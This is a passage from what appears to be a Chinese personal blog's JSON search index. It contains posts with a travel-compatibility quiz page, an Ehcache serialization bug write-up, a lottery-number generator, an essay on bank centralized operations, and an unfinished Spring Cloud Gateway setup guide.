[{"title":"微信小程序","url":"/2026/02/16/微信小程序/","content":"\n![默契心电感应](/image/17.jpg)"},{"title":"旅行匹配","url":"/2025/12/25/旅行匹配/","content":"\n<style>\n    :root {\n      --primary: #4f7cff;\n      --primary-light: #6366f1;\n      --bg: #f8fafc;\n      --card: #ffffff;\n      --text: #1f2937;\n      --text-secondary: #6b7280;\n      --border: #e2e8f0;\n      --success: #22c55e;\n      --danger: #ef4444;\n      --shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);\n      --radius: 16px;\n      --radius-sm: 12px;\n      --share: #3b82f6;        /* 蓝色系 - 分享按钮 */\n      --copy: #10b981;         /* 绿色系 - 复制按钮 */\n      --edit: #8b5cf6;         /* 紫色系 - 编辑按钮 */\n    }\n\n    * {\n      box-sizing: border-box;\n      margin: 0;\n      padding: 0;\n    }\n\n    body {\n      margin: 0;\n      background: var(--bg);\n      font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", \"PingFang SC\",\n        \"Hiragino Sans GB\", \"Helvetica Neue\", Arial, sans-serif;\n      color: var(--text);\n      line-height: 1.5;\n      padding: 16px;\n      padding-top: 0;\n    }\n\n    h1 {\n      text-align: center;\n      font-size: 22px;\n      margin: 20px 0 16px;\n      font-weight: 600;\n      color: var(--text);\n    }\n\n    h2 {\n      font-size: 20px;\n      margin-bottom: 16px;\n      text-align: center;\n      font-weight: 600;\n      color: var(--text);\n    }\n\n    #app {\n      max-width: 520px;\n      margin: 0 auto;\n      padding: 0 16px;\n    }\n\n    .card {\n      background: var(--card);\n      border-radius: var(--radius);\n      padding: 24px;\n      margin-bottom: 16px;\n      box-shadow: var(--shadow);\n      position: relative;\n    }\n\n    .btn {\n      width: 100%;\n      height: 48px;\n      border-radius: var(--radius-sm);\n      border: none;\n      background: var(--primary);\n      color: #fff;\n      font-size: 16px;\n      font-weight: 600;\n      cursor: pointer;\n      margin: 24px 0 0;\n      transition: all 0.3s ease;\n      box-shadow: 0 4px 6px rgba(79, 124, 255, 0.3);\n    }\n\n    .btn:hover {\n      background: var(--primary-light);\n      transform: translateY(-1px);\n    }\n\n    .btn.secondary {\n      background: #f1f5f9;\n      color: var(--text);\n      box-shadow: none;\n    }\n\n    .btn.secondary:hover {\n      background: #e2e8f0;\n    }\n\n    .action-buttons {\n      display: flex;\n      flex-direction: column;\n      gap: 12px;\n      margin-top: 20px;\n    }\n    \n    .action-btn {\n      height: 44px;\n      border-radius: var(--radius-sm);\n      border: none;\n      font-size: 15px;\n      font-weight: 500;\n      cursor: pointer;\n      transition: all 0.3s ease;\n      display: flex;\n      align-items: center;\n      justify-content: center;\n      gap: 8px;\n      box-shadow: var(--shadow);\n    }\n    \n    .btn-share {\n      background: var(--share);\n      color: white;\n    }\n    \n    .btn-share:hover {\n      background: #2563eb;\n      transform: translateY(-1px);\n    }\n    \n    .btn-copy {\n      background: var(--copy);\n      color: white;\n    }\n    \n    .btn-copy:hover {\n      background: #059669;\n      transform: translateY(-1px);\n    }\n    \n    .btn-edit {\n      background: var(--edit);\n      color: white;\n    }\n    \n    .btn-edit:hover {\n      background: #7c3aed;\n      transform: translateY(-1px);\n    }\n\n    .question {\n      margin-bottom: 20px;\n    }\n\n    .question label {\n      display: block;\n      font-size: 15px;\n      font-weight: 600;\n      margin-bottom: 8px;\n      color: var(--text);\n    }\n\n    select,\n    input[type=\"text\"] {\n      width: 100%;\n      height: 48px;\n      padding: 0 16px;\n      border-radius: var(--radius-sm);\n      border: 1px solid var(--border);\n      font-size: 15px;\n      background: #f8fafc;\n      transition: border-color 0.3s;\n      appearance: none;\n      background-image: url(\"data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='currentColor' stroke-width='2' stroke-linecap='round' stroke-linejoin='round'%3e%3cpolyline points='6 9 12 15 18 9'%3e%3c/polyline%3e%3c/svg%3e\");\n      background-repeat: no-repeat;\n      background-position: right 1rem center;\n      background-size: 1em;\n    }\n\n    select:focus,\n    input[type=\"text\"]:focus {\n      outline: none;\n      border-color: var(--primary);\n      box-shadow: 0 0 0 3px rgba(79, 124, 255, 0.2);\n    }\n\n    input[type=\"checkbox\"] {\n      width: 22px;\n      height: 22px;\n      margin-right: 12px;\n      accent-color: var(--primary);\n    }\n\n    .checkbox-group {\n      display: flex;\n      align-items: center;\n      padding: 12px 0;\n      border-bottom: 1px solid var(--border);\n    }\n\n    .checkbox-group:last-child {\n      border-bottom: none;\n    }\n\n    table {\n      width: 100%;\n      border-collapse: collapse;\n      font-size: 14px;\n      margin-top: 12px;\n      border-radius: var(--radius-sm);\n      overflow: hidden;\n    }\n\n    th {\n      background: #f1f5f9;\n      font-weight: 600;\n      padding: 12px;\n    }\n\n    th,\n    td {\n      border: 1px solid var(--border);\n      padding: 10px;\n      text-align: center;\n    }\n\n    .ok {\n      color: var(--success);\n      font-weight: bold;\n    }\n\n    .no {\n      color: var(--danger);\n      font-weight: bold;\n    }\n\n    .score {\n      font-size: 36px;\n      font-weight: 700;\n      color: var(--primary);\n      text-align: center;\n      margin: 16px 0;\n    }\n\n    .hint {\n      font-size: 13px;\n      color: var(--text-secondary);\n      text-align: center;\n      margin-top: 16px;\n    }\n\n    .result-container {\n      text-align: center;\n    }\n\n    .share-section {\n      margin-top: 24px;\n      padding-top: 20px;\n      border-top: 1px solid var(--border);\n    }\n\n    .copy-btn {\n      background: #f1f5f9;\n      border: none;\n      padding: 10px 16px;\n      border-radius: var(--radius-sm);\n      cursor: pointer;\n      font-size: 14px;\n      color: var(--text);\n      margin-top: 12px;\n      transition: background 0.3s;\n    }\n\n    .copy-btn:hover {\n      background: #e2e8f0;\n    }\n\n    .notification {\n      position: fixed;\n      top: 20px;\n      left: 50%;\n      transform: translateX(-50%);\n      background: rgba(0, 0, 0, 0.8);\n      color: white;\n      padding: 12px 24px;\n      border-radius: 8px;\n      z-index: 1000;\n      opacity: 0;\n      transition: opacity 0.3s;\n    }\n\n    .notification.show {\n      opacity: 1;\n    }\n\n    @media (max-width: 500px) {\n      body {\n        padding: 12px;\n        padding-top: 0;\n      }\n\n      .card {\n        padding: 20px;\n      }\n\n      h1 {\n        font-size: 20px;\n      }\n\n      h2 {\n        font-size: 18px;\n      }\n\n      #app {\n        padding: 0 8px;\n      }\n    }\n</style>\n\n\n<div id=\"app\"></div>\n<div id=\"notification\" class=\"notification\">链接已复制到剪贴板</div>\n\n<script>\n\nconst app = document.getElementById('app');\nconst notification = document.getElementById('notification');\nconst url = new URL(location.href);\nconst ownerParam = url.searchParams.get('owner');\n\n/* ======================\n   题库（根据你给的图片整理）\n====================== */\nconst questions = [\n  { id: 'name', label: '你的名字', type: 'text', match: false },\n\n  { id: 'out_time', label: '习惯的出门时间', type: 'single',\n    options: ['5点前','5-6点','6-7点','7-8点','8-9点','9-10点','10-11点','11点后','无所谓'] },\n\n  { id: 'sleep_time', label: '习惯的睡觉时间', type: 'single',\n    options: ['21点前','21-22点','22-23点','23-24点','0-1点','1-2点','2-3点','3点后','无所谓'] },\n\n  { id: 'photo_time', label: '习惯的拍照时长', type: 'single',\n    options: ['随手拍','1-2分钟','3-5分钟','6-9分钟','10-14分钟','15-19分钟','20-29分钟','30分钟以上','无所谓'] },\n\n  { id: 'hotel', label: '住宿条件要求', type: 'single',\n    options: ['青年旅舍','小旅馆','如家/7天','汉庭/海友','三星','四星','五星','豪华型','无所谓'] },\n\n  { id: 'energy', label: '体能情况', type: 'single',\n    options: ['避免运动','<10000步','<15000步','<20000步','<25000步','<30000步','准专业','运动员级','无所谓'] },\n\n  { id: 'food', label: '尽可能多吃本地特色', type: 'single',\n    options: ['是','否','无所谓'] },\n  { id: 'shopping', label: '需要逛商业街/商场', type: 'single',\n    options: ['是','否','无所谓'] },\n  { id: 'museum', label: '喜欢展馆类景点', type: 'single',\n    options: ['是','否','无所谓'] },\n  { id: 'nature', label: '喜欢山川自然景点', type: 'single',\n    options: ['是','否','无所谓'] },\n  { id: 'ancient', label: '喜欢古镇类景点', type: 'single',\n    options: ['是','否','无所谓'] },\n  { id: 'park', label: '喜欢乐园/娱乐项目', type: 'single',\n    options: ['是','否','无所谓'] },\n  { id: 'schedule_free', label: '可以不安排具体行程', type: 'single',\n    options: ['是','否','无所谓'] },\n  { id: 'hate_empty', label: '拒绝行程轮空', type: 'single',\n    options: ['是','否','无所谓'] },\n  { id: 'cold', label: '怕冷', type: 'single',\n    options: ['是','否','无所谓'] },\n  { id: 'hot', label: '怕热', type: 'single',\n    options: ['是','否','无所谓'] }\n];\n\n/* ======================\n   工具函数\n====================== */\nfunction encode(data) {\n  return btoa(encodeURIComponent(JSON.stringify(data)));\n}\nfunction decode(str) {\n  return JSON.parse(decodeURIComponent(atob(str)));\n}\n\n/* ======================\n   渲染表单\n====================== */\nfunction renderForm(onSubmit, preset = {}) {\n  let html = `<div class=\"card\">`;\n  questions.forEach(q => {\n    html += `<div class=\"question\"><label>${q.label}</label>`;\n    if (q.type === 'single') {\n      html += `<select id=\"${q.id}\">`;\n      q.options.forEach((opt, i) => {\n        const sel = preset[q.id] == i ? 'selected' : '';\n        html += `<option value=\"${i}\" ${sel}>${opt}</option>`;\n      });\n      html += `</select>`;\n    }\n    if (q.type === 'text') {\n      html += `<input type=\"text\" id=\"${q.id}\" value=\"${preset[q.id] || ''}\" placeholder=\"请输入${q.label}\" />`;\n    }\n    html += `</div>`;\n  });\n  html += `<button class=\"btn\" id=\"submit\">提交</button></div>`;\n  app.innerHTML = html;\n\n  document.getElementById('submit').onclick = () => {\n    const data = {};\n    questions.forEach(q => {\n      if (q.type === 'single') data[q.id] = Number(document.getElementById(q.id).value);\n      if (q.type === 'text') data[q.id] = document.getElementById(q.id).value || '匿名';\n    });\n    onSubmit(data);\n  };\n}\n\n/* ======================\n   匹配计算\n====================== */\nfunction calcMatch(a, b) {\n  let total = 0, same = 0;\n  questions.forEach(q => {\n    if (q.match === false) return;\n    total++;\n    // 如果其中一个选项是\"无所谓\"，则认为匹配\n    const lastOptionIndex = q.options.length - 1;\n    if (a[q.id] === lastOptionIndex || b[q.id] === lastOptionIndex) {\n      same++;\n    } else if (a[q.id] === b[q.id]) {\n      same++;\n    }\n  });\n  return Math.round((same / total) * 100);\n}\n\n/* ======================\n   结果页\n====================== */\nfunction renderResult(owner, other) {\n  const score = calcMatch(owner, other);\n  let html = `<div class=\"card result-container\"><h2>与你的匹配度 ${score}%</h2><table>\n    <tr><th>项目</th><th>${owner.name}</th><th>${other.name}</th><th></th></tr>`;\n\n  questions.forEach(q => {\n    if (q.type === 'text') return;\n    const a = owner[q.id];\n    const b = other[q.id];\n    let av = q.type === 'single' ? q.options[a] : (a ? '是' : '否');\n    let bv = q.type === 'single' ? q.options[b] : (b ? '是' : '否');\n    \n    // 匹配逻辑：如果其中一个选择是\"无所谓\"或选项相同，则匹配\n    const lastOptionIndex = q.options.length - 1;\n    const ok = (a === lastOptionIndex || b === lastOptionIndex || a === b);\n    html += `<tr>\n      <td>${q.label}</td>\n      <td>${av}</td>\n      <td>${bv}</td>\n      <td class=\"${ok ? 'ok' : 'no'}\">${ok ? '✔' : '✘'}</td>\n    </tr>`;\n  });\n\n  html += `</table></div>`;\n  app.innerHTML = html;\n}\n\n/* ======================\n   主流程\n====================== */\nconst myPref = localStorage.getItem('myPreference');\n\nif (!ownerParam && !myPref) {\n  app.innerHTML = `\n    <div class=\"card\">\n      <p>你还没有创建旅行喜好</p>\n      <button class=\"btn\" id=\"create\">创建我的旅行喜好</button>\n    </div>`;\n  document.getElementById('create').onclick = () =>\n    renderForm(data => {\n      localStorage.setItem('myPreference', JSON.stringify(data));\n      location.reload();\n    });\n}\n\nif (!ownerParam && myPref) {\n  const encoded = encode(JSON.parse(myPref));\n  const shareLink = `${location.origin}${location.pathname}?owner=${encoded}`;\n  app.innerHTML = `\n    <div class=\"card\">\n      <p align=\"center\">你的旅行喜好已创建</p>\n      <div class=\"share-section\">\n        <div class=\"action-buttons\">\n          <button class=\"action-btn btn-share\" id=\"shareBtn\"> 分享好友 </button>\n          <button class=\"action-btn btn-copy\" id=\"copyBtn\">复制链接</button>\n          <button class=\"action-btn btn-edit\" id=\"edit\">修改喜好</button>\n        </div>\n      </div>\n    </div>`;\n    \n  document.getElementById('edit').onclick = () =>\n    renderForm(data => {\n      localStorage.setItem('myPreference', JSON.stringify(data));\n      location.reload();\n    }, JSON.parse(myPref));\n    \n  document.getElementById('shareBtn').onclick = () => {\n    if (navigator.share) {\n      navigator.share({\n        title: '旅行搭子匹配',\n        text: '快来测试一下我们是否适合一起旅行吧！',\n        url: shareLink\n      }).catch(console.error);\n    } else {\n      copyToClipboard(shareLink);\n    }\n  };\n  \n  document.getElementById('copyBtn').onclick = () => {\n    copyToClipboard(shareLink);\n  };\n}\n\nif (ownerParam) {\n  const owner = decode(ownerParam);\n  renderForm(other => renderResult(owner, other));\n}\n\nfunction copyToClipboard(text) {\n  if (navigator.clipboard) {\n    navigator.clipboard.writeText(text).then(() => {\n      showNotification('链接已复制到剪贴板');\n    }).catch(err => {\n      console.error('复制失败', err);\n    });\n  } else {\n    // 降级处理\n    const textArea = document.createElement('textarea');\n    textArea.value = text;\n    document.body.appendChild(textArea);\n    textArea.select();\n    const successful = document.execCommand('copy');\n    document.body.removeChild(textArea);\n    if (successful) {\n      showNotification('链接已复制到剪贴板');\n    } else {\n      console.error('复制失败');\n    }\n  }\n}\n\nfunction showNotification(message) {\n  notification.textContent = message;\n  notification.classList.add('show');\n  setTimeout(() => {\n    notification.classList.remove('show');\n  }, 2000);\n}\n</script>\n\n\n\n\n"},{"title":"Ehcache与序列化","url":"/2025/09/16/Ehcache与序列化/","content":"\n业务老师反馈某个系统的用户添加功能突然不能用了(系统近期没有上线改动)，服务器看了下日志发现是空指针问题，心想，空指针问题，那可太简单了\n\n示意代码如下：\n\n\n```java\nimport java.io.Externalizable;\nimport java.io.IOException;\nimport java.io.ObjectInput;\nimport java.io.ObjectOutput;\n\npublic class UserDTO implements Externalizable {\n    private String id;\n    private String username;\n    private String email;\n    private String role;\n    private String organ;\n\n    public UserDTO() {}\n\n    public UserDTO(String id, String username, String email, String role, String organ) {\n        this.id = id;\n        this.username = username;\n        this.email = email;\n        this.role = role;\n        this.organ = organ;\n    }\n\n    @Override\n    public void writeExternal(ObjectOutput out) throws IOException {\n        out.writeUTF(id);\n        out.writeUTF(username);\n        out.writeUTF(email);\n        out.writeUTF(role);\n    }\n\n    @Override\n    public void readExternal(ObjectInput in) throws IOException, ClassNotFoundException {\n        this.id = in.readUTF();\n        this.username = in.readUTF();\n        this.email = in.readUTF();\n        this.role = in.readUTF();\n    }\n\n    @Override\n    public String toString() {\n        return \"UserDTO{\" +\n                \"id='\" + id + '\\'' +\n                \", username='\" + username + '\\'' +\n                \", email='\" + email + '\\'' +\n                \", role='\" + role + '\\'' +\n                \", organ='\" + organ + '\\'' +\n                '}';\n    }\n}\n\n\n```\n\n\n```java\n\nimport net.sf.ehcache.Cache;\nimport net.sf.ehcache.CacheManager;\nimport net.sf.ehcache.Element;\n\npublic class LoginService {\n    private static final CacheManager cacheManager = CacheManager.newInstance(\"src/main/resources/ehcache.xml\");\n    private static final Cache loginUserCache = cacheManager.getCache(\"loginUserCache\");\n\n    // 模拟登录\n    public static void login(String userId, String username, String email, String role) {\n        UserDTO user = new UserDTO(userId, username, email, role);\n\n        // 保存到 Ehcache\n        loginUserCache.put(new Element(userId, user));\n        System.out.println(\"用户已登录并写入缓存: \" + user);\n    }\n\n    // 从缓存中获取用户\n    public static UserDTO getUser(String userId) {\n        Element element = loginUserCache.get(userId);\n        if (element != null) {\n            return (UserDTO) element.getObjectValue();\n        }\n        return null;\n    }\n    \n}\n\n```\n\n如上代码所示，一般登陆之后，会将用户信息保存到缓存中，下次访问的时候，会从缓存中获取用户信息。某个功能发现从缓存里面取出来的user是有的， 但是机构字段却是空的，到处翻遍了代码发现，无论哪里都set了机构值，不可能为空（一整天都在到处翻代码思考到底是哪里漏set了，代码中还有一些ThreadLocal的东西，一度怀疑是不是多线程并发导致的问题）。\n\n\n```xml\n<!--name:缓存名称-->\n    <!--maxElementsInMemory:缓存最大个数-->\n    <!--eternal:缓存中对象是否为永久的，如果是，超时设置将被忽略，对象从不过期-->\n    <!--timeToIdleSeconds:置对象在失效前的允许闲置时间（单位：秒）,仅当eternal=false对象不是永久有效时使用，可选属性，默认值是0，也就是可闲置时间无穷大-->\n    <!--timeToLiveSeconds:缓存数据的生存时间（TTL），也就是一个元素从构建到消亡的最大时间间隔值，这只能在元素不是永久驻留时有效，如果该值是0就意味着元素可以停顿无穷长的时间-->\n    <!--overflowToDisk:内存不足时，是否启用磁盘缓存-->\n    <!--maxElementsOnDisk:设置成0 表示硬盘中最大缓存对象数无限大-->\n    <!--diskPersistent:设置成true表示缓存虚拟机重启期数据磁盘存储是否在虚拟机重启后持续存在-->\n    <cache name=\"loginUserCache\"\n           maxElementsInMemory=\"5000\"\n           eternal=\"true\"\n           maxElementsOnDisk=\"10000000\"\n           overflowToDisk=\"true\"\n           diskPersistent=\"true\"\n           memoryStoreEvictionPolicy=\"LRU\">\n        <!--<persistence strategy=\"localRestartable\" synchronousWrites=\"false\"/>-->\n    </cache>\n```\n\n回家路上突然灵感爆发，怀疑是ehcache序列化问题，果然一查发现maxElementsInMemory配置的5000，也就是当登陆超过5000次之后， 缓存就会开始写磁盘，而USERDTO的readExternal和writeExternal方法又漏了organ字段，序列化的时候就丢失了organ字段值。最终表现出来的现象是，登陆超过5000次之后，某些需要获取用户机构的功能就失效了。\n\n"},{"title":"馒头大乐透","url":"/2025/04/10/馒头大乐透/","content":"\n<style>\n    .article-entry {\n            margin: 0;\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, \"Helvetica Neue\", Arial;\n    }\n    .container {\n        background: white;\n        padding: 20px;\n        border-radius: 15px;\n        box-shadow: 0 10px 20px rgba(0,0,0,0.1);\n        text-align: center;\n        width: 90%;\n        max-width: 500px;\n        margin: 15px;\n    }\n    .numbers {\n        display: flex;\n        flex-wrap: wrap;\n        gap: 10px;\n        margin: 20px 0;\n        justify-content: center;\n    }\n    .number {\n        width: 50px;\n        height: 50px;\n        border-radius: 50%;\n        display: flex;\n        align-items: center;\n        justify-content: center;\n        font-size: 20px;\n        font-weight: bold;\n        color: white;\n        animation: bounce 0.5s;\n    }\n    @keyframes bounce {\n        0% { transform: scale(0); }\n        50% { transform: scale(1.2); }\n        100% { transform: scale(1); }\n    }\n    button {\n            padding: 15px 40px;\n            font-size: 18px;\n            border: none;\n            border-radius: 25px;\n            cursor: pointer;\n            color: white;\n            font-weight: bold;\n            background: linear-gradient(135deg, #ff9966, #ff5e62);\n            box-shadow: 0 4px 15px rgba(255, 94, 98, 0.4);\n            transition: all 0.3s ease;\n    }\n    button:hover {\n        transform: translateY(-2px);\n        box-shadow: 0 6px 20px rgba(255, 94, 98, 0.6);\n    }\n    button:active {\n        transform: translateY(1px);\n    }\n    @media (max-width: 480px) {\n        .number {\n            width: 50px;\n            height: 50px;\n            font-size: 20px;\n        }\n        h1 {\n            font-size: 20px;\n        }\n        button {\n            padding: 12px 30px;\n            font-size: 16px;\n        }\n    }\n    h1 {\n        font-size: 24px;\n        margin: 10px 0;\n    }\n\n    /* 移动端适配 */\n    @media (max-width: 480px) {\n        .container {\n            padding: 15px;\n            margin: 10px;\n        }\n        .number {\n            width: 40px;\n            height: 40px;\n            font-size: 18px;\n        }\n        h1 {\n            font-size: 20px;\n        }\n        button {\n            padding: 10px 20px;\n            font-size: 14px;\n        }\n    }\n\n    /* 超小屏幕适配 */\n    @media (max-width: 320px) {\n        .number {\n            width: 35px;\n            height: 35px;\n            font-size: 16px;\n        }\n        .numbers {\n            gap: 8px;\n        }\n    }\n</style>\n\n\n<div class=\"container\">\n    <div class=\"numbers\" id=\"numberContainer\"></div>\n    <button onclick=\"generateNumbers()\">吃个馒头</button>\n</div>\n\n<script>\n    const colors = [\n        '#FF6B6B', '#4ECDC4', '#45B7D1', \n        '#96CEB4', '#FFEEAD', '#D4A5A5',\n        '#9B59B6'\n    ];\n\n    function generateNumbers() {\n            const firstFive = [];\n            const lastTwo = [];\n            \n            // 生成前5个数字(1-35)\n            while(firstFive.length < 5) {\n                const num = Math.floor(Math.random() * 35) + 1;\n                if(!firstFive.includes(num)) {\n                    firstFive.push(num);\n                }\n            }\n            \n            // 生成后2个数字(1-12)\n            while(lastTwo.length < 2) {\n                const num = Math.floor(Math.random() * 12) + 1;\n                if(!lastTwo.includes(num)) {\n                    lastTwo.push(num);\n                }\n            }\n            \n            // 对数字进行排序\n            firstFive.sort((a, b) => a - b);\n            lastTwo.sort((a, b) => a - b);\n            \n            // 合并所有数字\n            const numbers = [...firstFive, ...lastTwo];\n            \n            const container = document.getElementById('numberContainer');\n            container.innerHTML = '';\n            \n            numbers.forEach((num, index) => {\n                const div = document.createElement('div');\n                div.className = 'number';\n                div.style.backgroundColor = colors[index];\n                div.textContent = num.toString().padStart(2, '0');\n                div.style.animation = `pop 0.3s ease ${index * 0.1}s`;\n                container.appendChild(div);\n            });\n    }\n\n    // 页面加载时生成一次号码\n    window.onload = generateNumbers;\n</script>\n\n\n\n\n"},{"title":"为什么银行需要集中作业系统","url":"/2025/03/17/为什么银行需要集中作业系统/","content":"\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;笔者从毕业开始做银行集中作业系统，中间兜兜转转了几家不同业务的公司，如今又回到了银行做集中作业系统，缘分总是这么奇妙。\n\n![集中作业架构图](/image/15.png)\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上图是一张典型的银行集中作业架构图，在讲集中作业之前，我们需要先了解下，传统银行非集中作业模式存在的几个问题：\n\n    **成本高**\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;银行在不断发展壮大之后，会存在大量的网点机构。由于银行业务众多，存款，贷款，开户，票据，转账，投资理财，信用卡等等，通常一个人是无法掌握所有业务的，所以传统银行的网点就要配置各种业务人员，甚至一个业务要配置多个人员，例如信用卡办理，包括资料审核员、征信检查员、风控人员等。即便部分偏远分行可能1个星期才有一笔信用卡业务，也不可避免的需要配置信用卡业务人员。在大型银行的众多网点中，人力成本居高不下。\n\n    **效率低**\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以客户开户为例，通常一个客户开户需要填写开户申请书，柜员除了扫描纸质开户申请书以外，还需要将客户填写的纸质文件内容录入到系统当中，包括姓名，地址，电话，职业，是否银行内部人员，等等。做过对公开户的朋友应该都知道，开户要录入系统的字段少则几十个，动则上百个，一个柜员要将这些字段录完需要花费大量的时间，这必然会导致客户排队等待，体验不佳，一些没有耐心的客户更是直接选择换家银行开户。新客户对银行的重要性就和国家人口出生率一样，没有增长仅靠存量最终只会走向衰败。\n\n    **服务标准不统一**\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;依旧以开户为例，企业客户要在银行开设对公账户（公司账户），过去的开户流程通常由各分行独立处理，例如，A分行可能要求企业提供额外的财务报表，而B分行不要求，导致企业开户体验不一致。可能出现某企业在A分行开户时被拒，但在B分行成功开户的情况。\n\n\n    **存在安全合规问题**\n\n\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;以贷款为例，A 分行要求所有贷款审批必须有两级复核，而 B 分行可能只需要一级复核，导致审核漏洞。领导利用自己的权限，和下属员工共同舞弊，即贷款业务的柜面提交人员和审核人员串通一气，为自己的亲戚朋友非法贷款。\n\n<br>\n\n![集中作业架构图](/image/16.png)\n\n<br>\n\n回看开头的图片，我们来看看集中作业系统，是如何解决以上几个问题的:\n\n\n    **降低成本**\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;从文首的图片可以看到，各个网点只剩下一个业务人员（为了理解夸张描述），负责的任务比较简单，初步审核客户填写的资料，然后从系统扫描纸质文件提交，等待后台人员处理任务即可。如此网点人员便可大幅精简，极大减少网点成本。而后台人员时刻都在不停获取不同分行的任务，处理任务，单个人员工作效率拉满。就不会存在某些网点由于一整天可能都没有一笔信用卡业务导致人员闲置，而有些网点又大量人员排队的情况。\n\n\n\n     **提高效率**\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上文我们讲到柜员一个人录入开户信息耗费大量时间，到集中作业之后，柜员提交的一个影像凭证，就会被系统切割成多个不同要素的图片，有多个外包人员共同录入不同部分，这就好比老师审核试卷，由一个人审核一份试卷，到不同的老师每个人审核一张试卷的不同题目，效率自然成倍提升。\n\n\n\n     **标准统一**\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于柜面只负责扫描凭证，而录入和审核等任务都集中由后台作业中心的人员处理，统一培训的作业人员，审核标准自然都是一致的，就不存在A分行可以开户成功，而B分行无法开户成功的情况存在了。\n\n\n\n     **控制风险**\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;柜员扫描凭证提交之后，后台任务将会被随机分配给后台不同的作业人员处理，内部员工之间想要串通一气的做法将变得困难，合规风险自然就降低了。\n\n\n\n\n\n\n\n\n\n\n"},{"title":"一片空白","url":"/2024/10/01/一片空白/","content":"\n今年的时间都奉献给工作了，所以啥也没有。"},{"title":"安卓web投屏工具","url":"/2023/04/04/安卓web投屏工具/","content":"\n在移动App信息安全的监测项目中，通常需要用到安卓web投屏，实时查看某些app的运行情况，可以使用stf，由于stf部署复杂，依赖众多，如果只要显示单个机器实时屏幕的情况下，部署stf过于浪费。以下为基于minicap和minitouch的安卓web投屏工具，[项目地址](https://github.com/weixiaojie/SSTF)，效果图如下：\n\n![安卓web投屏工具](/image/sstf.gif)\n\n\n\n\n"},{"title":"网关gateway搭建","url":"/2023/03/08/SpringCloudGateway搭建/","content":"\n**为什么需要网关**\n\n![项目管理学习笔记](/image/14.png)\n\n**为什么选择Spring cloud Gateway**\n\n常见的网关有gateway和zuul，和zuul相比，Spring Cloud Gateway具有如下优势：\n\n- 基于Reactor模型的WebFlux构建，运行在Netty上，具有更好的性能。\n- 可拓展性高，内置了非常丰富的断言及过滤器等，除此之外，我们也可以定义自己的断言和过滤器。\n\n**搭建gateway**\n\npom依赖配置：\n```pom\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<project xmlns=\"http://maven.apache.org/POM/4.0.0\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd\">\n    <modelVersion>4.0.0</modelVersion>\n\n    <parent>\n        <groupId>org.springframework.boot</groupId>\n        <artifactId>spring-boot-starter-parent</artifactId>\n        <version>2.2.1.RELEASE</version>\n        <relativePath/>\n    </parent>\n\n    <groupId>com.example</groupId>\n    <artifactId>gateway</artifactId>\n    <version>0.0.1-SNAPSHOT</version>\n    <name>gateway</name>\n    <description>gateway</description>\n\n    <properties>\n        <spring-cloud.version>Hoxton.RELEASE</spring-cloud.version>\n        <spring-cloud-alibaba.version>2.1.1.RELEASE</spring-cloud-alibaba.version>\n    </properties>\n\n    <!-- 只声明依赖，不引入依赖 -->\n    <dependencyManagement>\n        <dependencies>\n            <!-- 声明springCloud版本 -->\n            <dependency>\n                <groupId>org.springframework.cloud</groupId>\n                <artifactId>spring-cloud-dependencies</artifactId>\n                <version>${spring-cloud.version}</version>\n                <type>pom</type>\n                <scope>import</scope>\n            </dependency>\n            <!-- 声明 springCloud Alibaba 版本 -->\n            <dependency>\n                <groupId>com.alibaba.cloud</groupId>\n                <artifactId>spring-cloud-alibaba-dependencies</artifactId>\n                <version>${spring-cloud-alibaba.version}</version>\n                <type>pom</type>\n                <scope>import</scope>\n            </dependency>\n        </dependencies>\n    </dependencyManagement>\n\n    <dependencies>\n\n        <dependency>\n            <groupId>org.springframework.cloud</groupId>\n            <artifactId>spring-cloud-starter-gateway</artifactId>\n            <exclusions>\n                <exclusion>\n                    <groupId>org.springframework.boot</groupId>\n                    <artifactId>spring-boot-starter-web</artifactId>\n                </exclusion>\n            </exclusions>\n        </dependency>\n\n        <dependency>\n            <groupId>com.alibaba.cloud</groupId>\n            <artifactId>spring-cloud-starter-alibaba-nacos-discovery</artifactId>\n        </dependency>\n\n        <dependency>\n            <groupId>org.springframework.boot</groupId>\n            <artifactId>spring-boot-starter-test</artifactId>\n            <scope>test</scope>\n        </dependency>\n\n        <dependency>\n            <groupId>org.projectlombok</groupId>\n            <artifactId>lombok</artifactId>\n        </dependency>\n    </dependencies>\n\n</project>\n\n```\n\n\napplication.yml配置\n\n```\nserver:\n  port: 8080\n  servlet:\n    context-path: /${spring.application.name}\nspring:\n  application:\n    name: gateway\n  cloud:\n    nacos:\n      discovery:\n        server-addr: 127.0.0.1:8001\n\n    gateway:\n      # 路由数组：指当请求满足什么样的断言时，转发到哪个服务上\n      routes:\n        # 路由标识，要求唯一，名称任意\n        - id: route1\n          # 请求最终被转发到的目标地址\n          #uri: http://localhost:8081\n          uri: lb://provider1\n          # 设置断言\n          predicates:\n            # Path Route Predicate Factory 断言，满足 /gateway/provider1/** 路径的请求都会被路由到 http://localhost:8081 这个uri中\n            - Path=/gateway/provider1/**\n          # 配置过滤器（局部）\n          filters:\n            # StripPrefix：去除原始请求路径中的前2级路径，即/gateway/provider1\n            - StripPrefix=2\n            - AddRequestHeader=X-Request-red, blue\n            - My\n\n        - id: route2\n          #uri: http://localhost:8082\n          uri: lb://provider2\n          # 设置断言\n          predicates:\n            - Path=/gateway/provider2/**\n          # 配置过滤器（局部）\n          filters:\n            # 